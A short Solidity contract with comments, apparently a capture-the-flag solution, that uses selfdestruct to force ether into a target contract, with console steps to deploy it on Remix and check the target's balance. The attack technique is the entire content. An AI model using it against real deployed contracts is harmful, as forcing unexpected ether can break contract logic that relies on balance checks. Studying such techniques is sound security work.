// SPDX-License-Identifier: MIT
pragma solidity ^0.4.0;

contract ForceAttack {
  
  constructor() public payable {
  }
  
  function attack(address _forceAddress) public {
    selfdestruct(_forceAddress);
  }
   
}

/** This is the code we created.

Now in the console we get the contract address: await contract.address

We deploy the attack contract on remix with 1 wei of value, because the constructor is payable. Then we pass the contract address for the attack function

await getBalance(contract.address) to check balance */